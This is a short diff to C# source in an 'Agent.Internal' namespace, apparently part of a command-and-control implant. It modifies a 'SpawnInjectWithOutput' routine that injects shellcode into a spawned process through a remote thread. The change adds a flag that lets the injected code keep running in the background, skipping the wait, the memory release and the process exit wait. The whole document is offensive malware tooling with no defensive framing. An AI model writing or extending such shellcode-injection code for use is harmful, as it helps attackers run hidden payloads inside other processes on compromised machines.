@@ -49,7 +49,7 @@ namespace Agent.Internal
         }
 
 
-        public static InjectionResult SpawnInjectWithOutput(byte[] shellcode, string processName)
+        public static InjectionResult SpawnInjectWithOutput(byte[] shellcode, string processName, bool waitEndToContinue = false)
         {
             var ret = new InjectionResult();
             var startInfo = new ProcessStartInfo()
@@ -126,8 +126,8 @@ namespace Agent.Internal
                 {
                     throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                 }
-
-                Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
+                if (waitEndToContinue)
+                    Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
             }
             catch (InvalidOperationException e)
             {
@@ -137,10 +137,12 @@ namespace Agent.Internal
             }
             finally
             {
-                Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
+                if (waitEndToContinue)
+                    Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
             }
 
-            process.WaitForExit();
+            if (waitEndToContinue)
+                process.WaitForExit();
 
             ret.Output = output;
             ret.Succeed = true;
